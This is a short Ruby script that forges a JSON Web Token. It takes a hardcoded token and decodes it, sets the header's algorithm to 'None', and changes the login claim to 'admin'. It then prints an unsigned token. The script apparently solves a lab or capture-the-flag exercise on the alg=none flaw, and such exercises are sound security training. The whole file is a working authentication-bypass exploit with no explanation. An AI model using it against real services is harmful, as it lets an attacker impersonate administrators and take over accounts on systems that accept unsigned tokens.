#!/usr/bin/env ruby

require "base64"
require "json"


jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImJkbWluIiwiaWF0IjoiMTUzMzA1NTUyOSJ9.MWRmNmIzOWE0MTM4YzI2YzJlODMyNzUzMmM1YjliMzBlNzk3N2JjMDY3OGU1N2Y5ODE4Njc0MGRhZGFjODYxMw"

if jwt.count(".") != 2
  abort "Error: JWT must have exactly 2 dots"
end

header_encoded, payload_encoded, signature_encoded = jwt.split(".")

header = Base64.urlsafe_decode64(header_encoded)
payload = Base64.urlsafe_decode64(payload_encoded)
signature = Base64.urlsafe_decode64(signature_encoded)

header_hash = JSON.parse(header)

if !header_hash.has_key?("alg")
  abort "Error: Header is missing an alg value"
end

header_hash["alg"] = "None"
header_modified = header_hash.to_json
header_modified_encoded = Base64.urlsafe_encode64(header_modified).split("=")[0]

payload_hash = JSON.parse(payload)

if !payload_hash.has_key?("login")
  abort "Error: Payload is missing a login value"
end

payload_hash["login"] = "admin"
payload_modified = payload_hash.to_json
payload_modified_encoded = Base64.urlsafe_encode64(payload_modified).split("=")[0]

puts "#{header_modified_encoded}.#{payload_modified_encoded}."
